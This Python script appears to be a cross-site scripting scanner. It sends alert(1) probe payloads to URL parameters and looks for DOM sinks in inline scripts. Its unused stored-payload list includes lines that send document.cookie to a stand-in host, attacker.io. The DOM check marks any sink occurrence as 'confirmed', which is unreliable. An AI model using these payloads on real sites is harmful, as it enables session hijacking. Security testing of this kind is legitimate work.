#!/usr/bin/env python3
"""Cross-Site Scripting Testing Framework"""
import argparse
import requests
import json
import re
from urllib.parse import urljoin, urlparse

class XSSTester:
    REFLECTED_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '" onmouseover="alert(1)',
        '"/><script>alert(1)</script>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>',
        '{{constructor.constructor("alert(1)")()}}',
    ]

    STORED_PAYLOADS = [
        '<script>fetch("https://attacker.io/steal?c="+document.cookie)</script>',
        '<img src="https://attacker.io/log?cookie="+document.cookie>',
        '<svg/onload=eval(name)>',
    ]

    def __init__(self, target_url, params, cookies=None):
        self.target = target_url
        self.params = params
        self.session = requests.Session()
        if cookies:
            self.session.cookies.update(cookies)
        self.results = []

    def test_reflected(self):
        for param in self.params:
            for payload in self.REFLECTED_PAYLOADS:
                try:
                    resp = self.session.get(
                        self.target,
                        params={param: payload},
                        timeout=10
                    )
                    if payload in resp.text:
                        self.results.append({
                            'type': 'reflected',
                            'param': param,
                            'payload': payload,
                            'url': resp.url,
                            'confirmed': True
                        })
                except:
                    pass
        return self.results

    def test_dom_based(self):
        try:
            resp = self.session.get(self.target, timeout=10)
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL)
            for script in scripts:
                sinks = ['innerHTML', 'document.write', 'eval(', 'location.href']
                for sink in sinks:
                    if sink in script:
                        self.results.append({
                            'type': 'dom_based',
                            'sink': sink,
                            'script_preview': script[:200],
                            'confirmed': True
                        })
        except:
            pass
        return self.results

    def scan(self):
        self.test_reflected()
        self.test_dom_based()
        return {'target': self.target, 'results': self.results}

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--params', nargs='+', default=['q', 'search', 'id', 'name', 'query'])
    args = parser.parse_args()
    tester = XSSTester(args.url, args.params)
    print(json.dumps(tester.scan(), indent=2))
